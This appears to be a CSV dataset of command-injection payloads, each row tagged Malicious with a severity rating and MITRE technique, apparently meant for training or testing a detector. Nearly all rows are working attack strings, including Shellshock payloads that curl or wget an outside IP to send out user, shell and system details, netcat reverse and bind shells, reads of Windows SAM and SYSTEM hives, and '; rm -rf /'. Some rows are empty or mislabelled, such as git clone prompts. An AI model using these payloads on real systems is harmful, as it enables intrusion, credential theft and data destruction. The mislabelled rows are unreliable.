Payload,Signature,AttackType,Severity,MITRE,Label,Description
system('curl https://crowdshield.com/.testing/rce_vuln.txt'),Command Injection,Command Injection,Critical,T1190,Malicious,Command Injection payload from comprehensive dataset
system('curl https://crowdshield.com/.testing/rce_vuln.txt?req=22fd2wdf'),Command Injection,Command Injection,Critical,T1190,Malicious,Command Injection payload from comprehensive dataset
system('curl https://xerosecurity.com/.testing/rce_vuln.txt');,Command Injection,Command Injection,Critical,T1190,Malicious,Command Injection payload from comprehensive dataset
system('echo XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX'),Command Injection,Command Injection,Critical,T1190,Malicious,Command Injection payload from comprehensive dataset
systeminfo,Command Injection,Command Injection,Low,T1190,Malicious,Command Injection payload from comprehensive dataset
| systeminfo,Command Injection,Command Injection,Low,T1190,Malicious,Command Injection payload from comprehensive dataset
; systeminfo,Command Injection,Command Injection,Low,T1190,Malicious,Command Injection payload from comprehensive dataset
& systeminfo,Command Injection,Command Injection,Low,T1190,Malicious,Command Injection payload from comprehensive dataset
&& systeminfo,Command Injection,Command Injection,Low,T1190,Malicious,Command Injection payload from comprehensive dataset
system('ls'),Command Injection,Command Injection,Critical,T1190,Malicious,Command Injection payload from comprehensive dataset
system('pwd'),Command Injection,Command Injection,Critical,T1190,Malicious,Command Injection payload from comprehensive dataset
system('pwd');,Command Injection,Command Injection,Critical,T1190,Malicious,Command Injection payload from comprehensive dataset
|| system('sleep 5');,Command Injection,Command Injection,Critical,T1190,Malicious,Command Injection payload from comprehensive dataset
| system('sleep 5');,Command Injection,Command Injection,Critical,T1190,Malicious,Command Injection payload from comprehensive dataset
; system('sleep 5');,Command Injection,Command Injection,Critical,T1190,Malicious,Command Injection payload from comprehensive dataset
& system('sleep 5');,Command Injection,Command Injection,Critical,T1190,Malicious,Command Injection payload from comprehensive dataset
&& system('sleep 5');,Command Injection,Command Injection,Critical,T1190,Malicious,Command Injection payload from comprehensive dataset
system('sleep 5'),Command Injection,Command Injection,Critical,T1190,Malicious,Command Injection payload from comprehensive dataset
system('sleep 5');,Command Injection,Command Injection,Critical,T1190,Malicious,Command Injection payload from comprehensive dataset
system('wget https://crowdshield.com/.testing/rce_vuln.txt?req=22fd2w23'),Command Injection,Command Injection,Critical,T1190,Malicious,Command Injection payload from comprehensive dataset
system('wget https://xerosecurity.com/.testing/rce_vuln.txt');,Command Injection,Command Injection,Critical,T1190,Malicious,Command Injection payload from comprehensive dataset
system('whoami'),Command Injection,Command Injection,Critical,T1190,Malicious,Command Injection payload from comprehensive dataset
system('whoami');,Command Injection,Command Injection,Critical,T1190,Malicious,Command Injection payload from comprehensive dataset
test*; ls -lhtR /var/www/,Command Injection,Command Injection,Low,T1190,Malicious,Command Injection payload from comprehensive dataset
"test* || perl -e 'print ""X""x16096'",Command Injection,Command Injection,Low,T1190,Malicious,Command Injection payload from comprehensive dataset
"test* | perl -e 'print ""X""x16096'",Command Injection,Command Injection,Low,T1190,Malicious,Command Injection payload from comprehensive dataset
"test* & perl -e 'print ""X""x16096'",Command Injection,Command Injection,Low,T1190,Malicious,Command Injection payload from comprehensive dataset
"test* && perl -e 'print ""X""x16096'",Command Injection,Command Injection,Low,T1190,Malicious,Command Injection payload from comprehensive dataset
"test*; perl -e 'print ""X""x16096'",Command Injection,Command Injection,Low,T1190,Malicious,Command Injection payload from comprehensive dataset
$(`type C:\boot.ini`),Command Injection,Command Injection,Medium,T1190,Malicious,Command Injection payload from comprehensive dataset
&&type C:\\boot.ini,Command Injection,Command Injection,Medium,T1190,Malicious,Command Injection payload from comprehensive dataset
| type C:\Windows\repair\SAM,Command Injection,Command Injection,Medium,T1190,Malicious,Command Injection payload from comprehensive dataset
; type C:\Windows\repair\SAM,Command Injection,Command Injection,Medium,T1190,Malicious,Command Injection payload from comprehensive dataset
& type C:\Windows\repair\SAM,Command Injection,Command Injection,Medium,T1190,Malicious,Command Injection payload from comprehensive dataset
&& type C:\Windows\repair\SAM,Command Injection,Command Injection,Medium,T1190,Malicious,Command Injection payload from comprehensive dataset
type C:\Windows\repair\SAM,Command Injection,Command Injection,Medium,T1190,Malicious,Command Injection payload from comprehensive dataset
| type C:\Windows\repair\SYSTEM,Command Injection,Command Injection,Medium,T1190,Malicious,Command Injection payload from comprehensive dataset
; type C:\Windows\repair\SYSTEM,Command Injection,Command Injection,Medium,T1190,Malicious,Command Injection payload from comprehensive dataset
& type C:\Windows\repair\SYSTEM,Command Injection,Command Injection,Medium,T1190,Malicious,Command Injection payload from comprehensive dataset
&& type C:\Windows\repair\SYSTEM,Command Injection,Command Injection,Medium,T1190,Malicious,Command Injection payload from comprehensive dataset
type C:\Windows\repair\SYSTEM,Command Injection,Command Injection,Medium,T1190,Malicious,Command Injection payload from comprehensive dataset
| type C:\WINNT\repair\SAM,Command Injection,Command Injection,Medium,T1190,Malicious,Command Injection payload from comprehensive dataset
; type C:\WINNT\repair\SAM,Command Injection,Command Injection,Medium,T1190,Malicious,Command Injection payload from comprehensive dataset
& type C:\WINNT\repair\SAM,Command Injection,Command Injection,Medium,T1190,Malicious,Command Injection payload from comprehensive dataset
&& type C:\WINNT\repair\SAM,Command Injection,Command Injection,Medium,T1190,Malicious,Command Injection payload from comprehensive dataset
type C:\WINNT\repair\SAM,Command Injection,Command Injection,Medium,T1190,Malicious,Command Injection payload from comprehensive dataset
type C:\WINNT\repair\SYSTEM,Command Injection,Command Injection,Medium,T1190,Malicious,Command Injection payload from comprehensive dataset
| type %SYSTEMROOT%\repair\SAM,Command Injection,Command Injection,Medium,T1190,Malicious,Command Injection payload from comprehensive dataset
; type %SYSTEMROOT%\repair\SAM,Command Injection,Command Injection,Medium,T1190,Malicious,Command Injection payload from comprehensive dataset
& type %SYSTEMROOT%\repair\SAM,Command Injection,Command Injection,Medium,T1190,Malicious,Command Injection payload from comprehensive dataset
&& type %SYSTEMROOT%\repair\SAM,Command Injection,Command Injection,Medium,T1190,Malicious,Command Injection payload from comprehensive dataset
type %SYSTEMROOT%\repair\SAM,Command Injection,Command Injection,Medium,T1190,Malicious,Command Injection payload from comprehensive dataset
| type %SYSTEMROOT%\repair\SYSTEM,Command Injection,Command Injection,Medium,T1190,Malicious,Command Injection payload from comprehensive dataset
; type %SYSTEMROOT%\repair\SYSTEM,Command Injection,Command Injection,Medium,T1190,Malicious,Command Injection payload from comprehensive dataset
& type %SYSTEMROOT%\repair\SYSTEM,Command Injection,Command Injection,Medium,T1190,Malicious,Command Injection payload from comprehensive dataset
&& type %SYSTEMROOT%\repair\SYSTEM,Command Injection,Command Injection,Medium,T1190,Malicious,Command Injection payload from comprehensive dataset
type %SYSTEMROOT%\repair\SYSTEM,Command Injection,Command Injection,Medium,T1190,Malicious,Command Injection payload from comprehensive dataset
uname,Command Injection,Command Injection,Low,T1190,Malicious,Command Injection payload from comprehensive dataset
;uname;,Command Injection,Command Injection,Low,T1190,Malicious,Command Injection payload from comprehensive dataset
| uname -a,Command Injection,Command Injection,High,T1190,Malicious,Command Injection payload from comprehensive dataset
; uname -a,Command Injection,Command Injection,High,T1190,Malicious,Command Injection payload from comprehensive dataset
& uname -a,Command Injection,Command Injection,High,T1190,Malicious,Command Injection payload from comprehensive dataset
&& uname -a,Command Injection,Command Injection,High,T1190,Malicious,Command Injection payload from comprehensive dataset
uname -a,Command Injection,Command Injection,High,T1190,Malicious,Command Injection payload from comprehensive dataset
|/usr/bin/id,Command Injection,Command Injection,Low,T1190,Malicious,Command Injection payload from comprehensive dataset
;|/usr/bin/id|,Command Injection,Command Injection,Low,T1190,Malicious,Command Injection payload from comprehensive dataset
;/usr/bin/id|,Command Injection,Command Injection,Low,T1190,Malicious,Command Injection payload from comprehensive dataset
$;/usr/bin/id,Command Injection,Command Injection,Low,T1190,Malicious,Command Injection payload from comprehensive dataset
"() { :;};/usr/bin/perl -e 'print \""Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\"";system(\""wget http://135.23.158.130/.testing/shellshock.txt?vuln=13;curl http://135.23.158.130/.testing/shellshock.txt?vuln=15;\"");'",Command Injection,Command Injection,Critical,T1190,Malicious,Command Injection payload from comprehensive dataset
() { :;}; wget http://135.23.158.130/.testing/shellshock.txt?vuln=11,Command Injection,Command Injection,Medium,T1190,Malicious,Command Injection payload from comprehensive dataset
$(`wget https://crowdshield.com/.testing/rce_vuln.txt`),Command Injection,Command Injection,Medium,T1190,Malicious,Command Injection payload from comprehensive dataset
$(`wget https://crowdshield.com/.testing/rce_vuln.txt?req=22jjffjbn`),Command Injection,Command Injection,Medium,T1190,Malicious,Command Injection payload from comprehensive dataset
which curl,Command Injection,Command Injection,Low,T1190,Malicious,Command Injection payload from comprehensive dataset
which gcc,Command Injection,Command Injection,Low,T1190,Malicious,Command Injection payload from comprehensive dataset
which nc,Command Injection,Command Injection,Low,T1190,Malicious,Command Injection payload from comprehensive dataset
which netcat,Command Injection,Command Injection,Low,T1190,Malicious,Command Injection payload from comprehensive dataset
which perl,Command Injection,Command Injection,Low,T1190,Malicious,Command Injection payload from comprehensive dataset
which python,Command Injection,Command Injection,Low,T1190,Malicious,Command Injection payload from comprehensive dataset
which wget,Command Injection,Command Injection,Low,T1190,Malicious,Command Injection payload from comprehensive dataset
whoami,Command Injection,Command Injection,High,T1190,Malicious,Command Injection payload from comprehensive dataset
| whoami,Command Injection,Command Injection,High,T1190,Malicious,Command Injection payload from comprehensive dataset
; whoami,Command Injection,Command Injection,High,T1190,Malicious,Command Injection payload from comprehensive dataset
' whoami,Command Injection,Command Injection,High,T1190,Malicious,Command Injection payload from comprehensive dataset
' || whoami,Command Injection,Command Injection,High,T1190,Malicious,Command Injection payload from comprehensive dataset
' & whoami,Command Injection,Command Injection,High,T1190,Malicious,Command Injection payload from comprehensive dataset
' && whoami,Command Injection,Command Injection,High,T1190,Malicious,Command Injection payload from comprehensive dataset
'; whoami,Command Injection,Command Injection,High,T1190,Malicious,Command Injection payload from comprehensive dataset
""" whoami",Command Injection,Command Injection,High,T1190,Malicious,Command Injection payload from comprehensive dataset
""" || whoami",Command Injection,Command Injection,High,T1190,Malicious,Command Injection payload from comprehensive dataset
""" | whoami",Command Injection,Command Injection,High,T1190,Malicious,Command Injection payload from comprehensive dataset
""" & whoami",Command Injection,Command Injection,High,T1190,Malicious,Command Injection payload from comprehensive dataset
""" && whoami",Command Injection,Command Injection,High,T1190,Malicious,Command Injection payload from comprehensive dataset
"""; whoami",Command Injection,Command Injection,High,T1190,Malicious,Command Injection payload from comprehensive dataset
$(`whoami`),Command Injection,Command Injection,High,T1190,Malicious,Command Injection payload from comprehensive dataset
& whoami,Command Injection,Command Injection,High,T1190,Malicious,Command Injection payload from comprehensive dataset
&& whoami,Command Injection,Command Injection,High,T1190,Malicious,Command Injection payload from comprehensive dataset
"{{ get_user_file(""C:\boot.ini"") }}",Command Injection,Command Injection,Low,T1190,Malicious,Command Injection payload from comprehensive dataset
{{4+4}},Command Injection,Command Injection,Low,T1190,Malicious,Command Injection payload from comprehensive dataset
{{4+8}},Command Injection,Command Injection,Low,T1190,Malicious,Command Injection payload from comprehensive dataset
{{person.secret}},Command Injection,Command Injection,Low,T1190,Malicious,Command Injection payload from comprehensive dataset
{{person.name}},Command Injection,Command Injection,Low,T1190,Malicious,Command Injection payload from comprehensive dataset
{1} + {1},Command Injection,Command Injection,Low,T1190,Malicious,Command Injection payload from comprehensive dataset
{{[] .__ Class __.__ base __.__ subclasses __ ()}},Command Injection,Command Injection,Low,T1190,Malicious,Command Injection payload from comprehensive dataset
root@ismailtasdelen:~# git clone https://github.com/ismailtasdelen/command-injection-payload-list.git,Command Injection,Command Injection,Medium,T1190,Malicious,Command Injection payload from comprehensive dataset
root@ismailtasdelen:~# git clone git@github.com:ismailtasdelen/command-injection-payload-list.git,Command Injection,Command Injection,Low,T1190,Malicious,Command Injection payload from comprehensive dataset
",Command Injection,Command Injection,Critical,T1190,Malicious,Command Injection payload from comprehensive dataset
",Command Injection,Command Injection,Critical,T1190,Malicious,Command Injection payload from comprehensive dataset
",Command Injection,Command Injection,Low,T1190,Malicious,Command Injection payload from comprehensive dataset
() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=16?user=\",Command Injection,Command Injection,Medium,T1190,Malicious,Command Injection payload from comprehensive dataset
"() { :;}; /bin/bash -c """"curl http://135.23.158.130/.testing/shellshock.txt?vuln=18?pwd=\""",Command Injection,Command Injection,Medium,T1190,Malicious,Command Injection payload from comprehensive dataset
"() { :;}; /bin/bash -c """"curl http://135.23.158.130/.testing/shellshock.txt?vuln=20?shadow=\""",Command Injection,Command Injection,Medium,T1190,Malicious,Command Injection payload from comprehensive dataset
"() { :;}; /bin/bash -c """"curl http://135.23.158.130/.testing/shellshock.txt?vuln=22?uname=\""",Command Injection,Command Injection,Medium,T1190,Malicious,Command Injection payload from comprehensive dataset
"() { :;}; /bin/bash -c """"curl http://135.23.158.130/.testing/shellshock.txt?vuln=24?shell=\""",Command Injection,Command Injection,Medium,T1190,Malicious,Command Injection payload from comprehensive dataset
"() { :;}; /bin/bash -c """"curl http://135.23.158.130/.testing/shellshock.txt?vuln=26?shell=\""",Command Injection,Command Injection,Medium,T1190,Malicious,Command Injection payload from comprehensive dataset
"() { :;}; /bin/bash -c """"wget http://135.23.158.130/.testing/shellshock.txt?vuln=17?user=\""",Command Injection,Command Injection,Medium,T1190,Malicious,Command Injection payload from comprehensive dataset
"() { :;}; /bin/bash -c """"wget http://135.23.158.130/.testing/shellshock.txt?vuln=19?pwd=\""",Command Injection,Command Injection,Medium,T1190,Malicious,Command Injection payload from comprehensive dataset
"() { :;}; /bin/bash -c """"wget http://135.23.158.130/.testing/shellshock.txt?vuln=21?shadow=\""",Command Injection,Command Injection,Medium,T1190,Malicious,Command Injection payload from comprehensive dataset
"() { :;}; /bin/bash -c """"wget http://135.23.158.130/.testing/shellshock.txt?vuln=23?uname=\""",Command Injection,Command Injection,Medium,T1190,Malicious,Command Injection payload from comprehensive dataset
"() { :;}; /bin/bash -c """"wget http://135.23.158.130/.testing/shellshock.txt?vuln=25?shell=\""",Command Injection,Command Injection,Medium,T1190,Malicious,Command Injection payload from comprehensive dataset
"() { :;}; /bin/bash -c """"wget http://135.23.158.130/.testing/shellshock.txt?vuln=27?shell=\""",Command Injection,Command Injection,Medium,T1190,Malicious,Command Injection payload from comprehensive dataset
&& nc -e /bin/sh attacker.com 4444,Command Injection,Command Injection,High,T1190,Malicious,Command Injection payload from comprehensive dataset
",Command Injection,Command Injection,Critical,T1190,Malicious,Command Injection payload from comprehensive dataset
",Command Injection,Command Injection,Low,T1190,Malicious,Command Injection payload from comprehensive dataset
ping -c 21 127.0.0.1,Command Injection,Command Injection,Medium,T1190,Malicious,Command Injection payload from comprehensive dataset
ping -c 21 127.0.0.1,Command Injection,Command Injection,Medium,T1190,Malicious,Command Injection payload from comprehensive dataset
curl https://crowdshield.com/.testing/rce_vuln.txt?req=22jjffjbn,Command Injection,Command Injection,Medium,T1190,Malicious,Command Injection payload from comprehensive dataset
whoami\,Command Injection,Command Injection,High,T1190,Malicious,Command Injection payload from comprehensive dataset
whoami\,Command Injection,Command Injection,High,T1190,Malicious,Command Injection payload from comprehensive dataset
ping 127.0.0.1,Command Injection,Command Injection,Medium,T1190,Malicious,Command Injection payload from comprehensive dataset
type C:\boot.ini,Command Injection,Command Injection,Medium,T1190,Malicious,Command Injection payload from comprehensive dataset
wget https://crowdshield.com/.testing/rce_vuln.txt?req=22jjffjbn,Command Injection,Command Injection,Medium,T1190,Malicious,Command Injection payload from comprehensive dataset
whoami,Command Injection,Command Injection,High,T1190,Malicious,Command Injection payload from comprehensive dataset
",Command Injection,Command Injection,Medium,T1190,Malicious,Command Injection payload from comprehensive dataset
",Command Injection,Command Injection,Medium,T1190,Malicious,Command Injection payload from comprehensive dataset
",Command Injection,Command Injection,Low,T1190,Malicious,Command Injection payload from comprehensive dataset
",Command Injection,Command Injection,Low,T1190,Malicious,Command Injection payload from comprehensive dataset
&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;,Command Injection,Command Injection,High,T1190,Malicious,Command Injection payload from comprehensive dataset
&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;,Command Injection,Command Injection,High,T1190,Malicious,Command Injection payload from comprehensive dataset
/index.html|id|,Command Injection,Command Injection,Low,T1190,Malicious,Command Injection payload from comprehensive dataset
;id;,Command Injection,Command Injection,High,T1190,Malicious,Command Injection payload from comprehensive dataset
; ping -c 10 attacker.com,Command Injection,Command Injection,Low,T1190,Malicious,Command Injection payload from comprehensive dataset
;netstat -a;,Command Injection,Command Injection,Low,T1190,Malicious,Command Injection payload from comprehensive dataset
;id;,Command Injection,Command Injection,High,T1190,Malicious,Command Injection payload from comprehensive dataset
; rm -rf /,Command Injection,Command Injection,Low,T1190,Malicious,Command Injection payload from comprehensive dataset
|/usr/bin/id,Command Injection,Command Injection,Low,T1190,Malicious,Command Injection payload from comprehensive dataset
|id|,Command Injection,Command Injection,Low,T1190,Malicious,Command Injection payload from comprehensive dataset
|/usr/bin/id|,Command Injection,Command Injection,Low,T1190,Malicious,Command Injection payload from comprehensive dataset
||/usr/bin/id|,Command Injection,Command Injection,Low,T1190,Malicious,Command Injection payload from comprehensive dataset
|id;,Command Injection,Command Injection,High,T1190,Malicious,Command Injection payload from comprehensive dataset
||/usr/bin/id;,Command Injection,Command Injection,High,T1190,Malicious,Command Injection payload from comprehensive dataset
;id|,Command Injection,Command Injection,Low,T1190,Malicious,Command Injection payload from comprehensive dataset
;|/usr/bin/id|,Command Injection,Command Injection,Low,T1190,Malicious,Command Injection payload from comprehensive dataset
\n/bin/ls -al\n,Command Injection,Command Injection,Low,T1190,Malicious,Command Injection payload from comprehensive dataset
\n/usr/bin/id\n,Command Injection,Command Injection,Low,T1190,Malicious,Command Injection payload from comprehensive dataset
\nid\n,Command Injection,Command Injection,Low,T1190,Malicious,Command Injection payload from comprehensive dataset
\n/usr/bin/id;,Command Injection,Command Injection,High,T1190,Malicious,Command Injection payload from comprehensive dataset
\nid;,Command Injection,Command Injection,High,T1190,Malicious,Command Injection payload from comprehensive dataset
\n/usr/bin/id|,Command Injection,Command Injection,Low,T1190,Malicious,Command Injection payload from comprehensive dataset
\nid|,Command Injection,Command Injection,Low,T1190,Malicious,Command Injection payload from comprehensive dataset
;/usr/bin/id\n,Command Injection,Command Injection,Low,T1190,Malicious,Command Injection payload from comprehensive dataset
;id\n,Command Injection,Command Injection,Low,T1190,Malicious,Command Injection payload from comprehensive dataset
|usr/bin/id\n,Command Injection,Command Injection,Low,T1190,Malicious,Command Injection payload from comprehensive dataset
|nid\n,Command Injection,Command Injection,Low,T1190,Malicious,Command Injection payload from comprehensive dataset
`id`,Command Injection,Command Injection,Low,T1190,Malicious,Command Injection payload from comprehensive dataset
`/usr/bin/id`,Command Injection,Command Injection,Low,T1190,Malicious,Command Injection payload from comprehensive dataset
a);id,Command Injection,Command Injection,Low,T1190,Malicious,Command Injection payload from comprehensive dataset
a;id,Command Injection,Command Injection,Low,T1190,Malicious,Command Injection payload from comprehensive dataset
a);id;,Command Injection,Command Injection,High,T1190,Malicious,Command Injection payload from comprehensive dataset
a;id;,Command Injection,Command Injection,High,T1190,Malicious,Command Injection payload from comprehensive dataset
a);id|,Command Injection,Command Injection,Low,T1190,Malicious,Command Injection payload from comprehensive dataset
a;id|,Command Injection,Command Injection,Low,T1190,Malicious,Command Injection payload from comprehensive dataset
a)|id,Command Injection,Command Injection,Low,T1190,Malicious,Command Injection payload from comprehensive dataset
a|id,Command Injection,Command Injection,Low,T1190,Malicious,Command Injection payload from comprehensive dataset
a)|id;,Command Injection,Command Injection,High,T1190,Malicious,Command Injection payload from comprehensive dataset
a|id,Command Injection,Command Injection,Low,T1190,Malicious,Command Injection payload from comprehensive dataset
|/bin/ls -al,Command Injection,Command Injection,Low,T1190,Malicious,Command Injection payload from comprehensive dataset
a);/usr/bin/id,Command Injection,Command Injection,Low,T1190,Malicious,Command Injection payload from comprehensive dataset
a;/usr/bin/id,Command Injection,Command Injection,Low,T1190,Malicious,Command Injection payload from comprehensive dataset
a);/usr/bin/id;,Command Injection,Command Injection,High,T1190,Malicious,Command Injection payload from comprehensive dataset
a;/usr/bin/id;,Command Injection,Command Injection,High,T1190,Malicious,Command Injection payload from comprehensive dataset
a);/usr/bin/id|,Command Injection,Command Injection,Low,T1190,Malicious,Command Injection payload from comprehensive dataset
a;/usr/bin/id|,Command Injection,Command Injection,Low,T1190,Malicious,Command Injection payload from comprehensive dataset
a)|/usr/bin/id,Command Injection,Command Injection,Low,T1190,Malicious,Command Injection payload from comprehensive dataset
a|/usr/bin/id,Command Injection,Command Injection,Low,T1190,Malicious,Command Injection payload from comprehensive dataset
a)|/usr/bin/id;,Command Injection,Command Injection,High,T1190,Malicious,Command Injection payload from comprehensive dataset
a|/usr/bin/id,Command Injection,Command Injection,Low,T1190,Malicious,Command Injection payload from comprehensive dataset
;system('id'),Command Injection,Command Injection,Critical,T1190,Malicious,Command Injection payload from comprehensive dataset
;system('/usr/bin/id'),Command Injection,Command Injection,Critical,T1190,Malicious,Command Injection payload from comprehensive dataset
%0A/usr/bin/id,Command Injection,Command Injection,Low,T1190,Malicious,Command Injection payload from comprehensive dataset
%0Aid,Command Injection,Command Injection,Low,T1190,Malicious,Command Injection payload from comprehensive dataset
%0A/usr/bin/id%0A,Command Injection,Command Injection,Low,T1190,Malicious,Command Injection payload from comprehensive dataset
%0Aid%0A,Command Injection,Command Injection,Low,T1190,Malicious,Command Injection payload from comprehensive dataset
& ping -i 30 127.0.0.1 &,Command Injection,Command Injection,Medium,T1190,Malicious,Command Injection payload from comprehensive dataset
& ping -n 30 127.0.0.1 &,Command Injection,Command Injection,Medium,T1190,Malicious,Command Injection payload from comprehensive dataset
%0a ping -i 30 127.0.0.1 %0a,Command Injection,Command Injection,Medium,T1190,Malicious,Command Injection payload from comprehensive dataset
`ping 127.0.0.1`,Command Injection,Command Injection,Medium,T1190,Malicious,Command Injection payload from comprehensive dataset
| id,Command Injection,Command Injection,Low,T1190,Malicious,Command Injection payload from comprehensive dataset
& id,Command Injection,Command Injection,Low,T1190,Malicious,Command Injection payload from comprehensive dataset
; id,Command Injection,Command Injection,Low,T1190,Malicious,Command Injection payload from comprehensive dataset
%0a id %0a,Command Injection,Command Injection,Low,T1190,Malicious,Command Injection payload from comprehensive dataset
`id`,Command Injection,Command Injection,Low,T1190,Malicious,Command Injection payload from comprehensive dataset
$;/usr/bin/id,Command Injection,Command Injection,Low,T1190,Malicious,Command Injection payload from comprehensive dataset
"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=16?user=\`whoami\`""",Command Injection,Command Injection,High,T1190,Malicious,Command Injection payload from comprehensive dataset
"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=18?pwd=\`pwd\`""",Command Injection,Command Injection,Medium,T1190,Malicious,Command Injection payload from comprehensive dataset
"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=22?uname=\`uname -a\`""",Command Injection,Command Injection,High,T1190,Malicious,Command Injection payload from comprehensive dataset
"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=24?shell=\`nc -lvvp 1234 -e /bin/bash\`""",Command Injection,Command Injection,Medium,T1190,Malicious,Command Injection payload from comprehensive dataset
"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=26?shell=\`nc -lvvp 1236 -e /bin/bash &\`""",Command Injection,Command Injection,Medium,T1190,Malicious,Command Injection payload from comprehensive dataset
"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=5""",Command Injection,Command Injection,Medium,T1190,Malicious,Command Injection payload from comprehensive dataset
"() { :;}; /bin/bash -c ""sleep 1 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=1&?vuln=6""",Command Injection,Command Injection,Medium,T1190,Malicious,Command Injection payload from comprehensive dataset
"() { :;}; /bin/bash -c ""sleep 1 && echo vulnerable 1""",Command Injection,Command Injection,Medium,T1190,Malicious,Command Injection payload from comprehensive dataset
"() { :;}; /bin/bash -c ""sleep 3 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=3&?vuln=7""",Command Injection,Command Injection,Medium,T1190,Malicious,Command Injection payload from comprehensive dataset
"() { :;}; /bin/bash -c ""sleep 3 && echo vulnerable 3""",Command Injection,Command Injection,Medium,T1190,Malicious,Command Injection payload from comprehensive dataset
"() { :;}; /bin/bash -c ""sleep 6 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=6&?vuln=8""",Command Injection,Command Injection,Medium,T1190,Malicious,Command Injection payload from comprehensive dataset
